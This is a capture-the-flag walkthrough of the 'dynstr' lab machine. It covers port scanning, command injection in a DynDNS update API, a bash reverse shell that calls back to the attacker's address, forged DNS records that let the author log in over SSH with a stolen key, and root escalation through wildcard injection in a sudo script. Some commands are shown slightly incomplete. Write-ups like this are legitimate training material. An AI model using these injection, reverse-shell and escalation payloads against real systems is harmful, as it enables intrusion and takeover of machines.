# dynstr

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.147
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 11:14 EDT
Nmap scan report for 10.129.71.147
Host is up (0.10s latency).
Not shown: 65327 filtered tcp ports (no-response), 205 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

### HTTP + DNS Enum

This was a corporate page for a DNS service:

<figure><img src="../../../.gitbook/assets/image (2729).png" alt=""><figcaption></figcaption></figure>

At the bottom, it appears we have to add `dyna.htb` to the `/etc/hosts` file:

<figure><img src="../../../.gitbook/assets/image (2554).png" alt=""><figcaption></figcaption></figure>

Also, there is some information on the page:

<figure><img src="../../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

Since DNS is open, we can use `dig`:

```
$ dig @10.129.71.147 dyna.htb 

; <<>> DiG 9.18.12-1-Debian <<>> @10.129.71.147 dyna.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39181
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 25dab4fc14a41eb001000000645a64350a151f2a2603b577 (good)
;; QUESTION SECTION:
;dyna.htb.                      IN      A

;; AUTHORITY SECTION:
dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030302 21600 3600 604800 60

;; Query time: 7 msec
;; SERVER: 10.129.71.147#53(10.129.71.147) (UDP)
;; WHEN: Tue May 09 11:18:16 EDT 2023
;; MSG SIZE  rcvd: 11
```

There is a `hostmaster` subdomain present, but it loads the same page. I ran a `gobuster`scan on the `hostmaster` subdomain in case it was different.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hostmaster.dyna.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hostmaster.dyna.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/09 11:20:29 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 327] [--> http://hostmaster.dyna.htb/assets/]
/nic                  (Status: 301) [Size: 324] [--> http://hostmaster.dyna.htb/nic/]
```

`/nic`? Loading it shows nothing, so let's do another `gobuster` scan.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hostmaster.dyna.htb/nic -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hostmaster.dyna.htb/nic
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/09 11:20:57 Starting gobuster in directory enumeration mode
===============================================================
/update               (Status: 200) [Size: 8]

$ curl http://hostmaster.dyna.htb/nic/update        
badauth
```

Weird. Googling "badauth DNS" shows us ths is an error caused by a DNS software called DynDns:

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Googling `/nic/update` reveals that this is actually an API that we can access:

{% embed url="https://help.dyn.com/remote-access-api/perform-update/" %}

This requires credentials, which we had found earlier, so let's try to use this API.&#x20;

```
$ curl http://dynadns:sndanyd@dyna.htb/nic/update?hostname=10.10.14.13
911 [wrngdom: 10.14.13]
```

Since this is taking our input and sending it somewhere, I tried some basic RCE injection.&#x20;

```
$ curl -G --data-urlencode 'hostname=10.10.14.13; curl 10.10.14.13/rce' http://dynadns:sndanyd@dyna.htb/nic/update
911 [wrngdom: 10.14.13; curl 10.10.14.13/rce]

$ curl -G --data-urlencode 'hostname=$(curl 10.10.14.13/rce)' http://dynadns:sndanyd@dyna.htb/nic/update 
911 [wrngdom: 10.14.13/rce)]
```

For some reaosn, it's having trouble displaying our IP address. It seems limited to 8 characters, so let's try to change our IP address to decimal mode. After some testing involving the different subdomains, we can find one that works:

```
$ curl -G --data-urlencode 'hostname=$(curl 168431117/rce).no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/update 
911 [nsupdate failed]
```

<figure><img src="../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

```
$ curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431117/4444 0>&1").no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/updat
```

<figure><img src="../../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We can't grab the user flag yet. There are 2 other users on the machine:

```
www-data@dynstr:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Mar 15  2021 .
drwxr-xr-x 18 root    root    4096 May 25  2021 ..
drwxr-xr-x  5 bindmgr bindmgr 4096 Mar 15  2021 bindmgr
drwxr-xr-x  3 dyna    dyna    4096 Mar 18  2021 dyna
```

### Bindmgr Shell

Within the `bindmgr` directory, there is a support case folder:

```
www-data@dynstr:/home/bindmgr$ ls
support-case-C62796521  user.txt
```

Within it, there are some folders for a script:

```
www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -la
total 436
drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13  2021 .
drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15  2021 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13  2021 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13  2021 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13  2021 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13  2021 strace-C62796521.txt
```

When we read the debug script, we can find a SSH private key within it:

<figure><img src="../../../.gitbook/assets/image (3215).png" alt=""><figcaption></figcaption></figure>

I tried to use this to `ssh` in as the user, but it seems that we are being blocked. On enumeration of the `authorized_keys` file, we cansee that it only accepts requests from `*.infra.dyna.htb`.

{% code overflow="wrap" %}
```
www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys 
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```
{% endcode %}

The next step here would be to update the DNS records using `nsupdate` such that a new domain would point to our machine and allow us to `ssh` in using the key we found. The hint here is to use `bind`, and this would require a key file from `/etc/bind`.&#x20;

```
www-data@dynstr:/etc/bind$ ls
bind.keys  db.empty   named.bindmgr             named.conf.options
db.0       db.local   named.conf                rndc.key
db.127     ddns.key   named.conf.default-zones  zones.rfc1918
db.255     infra.key  named.conf.local
```

The `infra.key` file is readable by us, so let's use that with the `-k` flag using `nsupdate`. For this particular case, since we are using `ssh`, we want the IP address to be resolvable from the domain name and vice versa. This means that we need to add both a PTR and an A type DNS record within the server. I had to use a writeup for this since I wasn't too familiar with DNS records.&#x20;

```
www-data@dynstr:/etc/bind$ nsupdate -k infra.key 
> server 127.0.0.1
> zone dyna.htb
> update add rouvin.infra.dyna.htb 86400 A 10.10.14.13
> send
> zone 10.in-addr.arpa
> update add 13.14.10.10.in-addr.arpa 86400 PTR rouvin.infra.dyna.htb
> send
```

Afterwards, we can `ssh` in as the user:

<figure><img src="../../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

### Sudo

When checking `sudo` privileges, this is what we see:

```
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

Here's the contents of the script:

```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

The vulnerability is in the usage of the wildcard.&#x20;

```bash
cp .version * /etc/bind/named.bindmgr/
```

Because this specified a wildcard and we can run it as `root`, this means we can preserve or copy file permissions (like SUID) over to other binaries using the `--preserve=mode` flag.&#x20;

First, we need to create a `.version` file with 42 within it because the script checks for the version run. Then, we can create a folder named `--preserve=mode` which abuses the wildcard and makes the file we created a flag.&#x20;

Then, we need to do `cp /bin/bash` to our file, and run the script using `sudo`:

```bash
echo > '--preserve=mode'
cp /bin/bash
chmod 4777 bash
echo 42 > .version
sudo /usr/local/bin/bindmgr.sh
/etc/bind/named.bindmgr/bash -p
```

<figure><img src="../../../.gitbook/assets/image (3346).png" alt=""><figcaption></figcaption></figure>
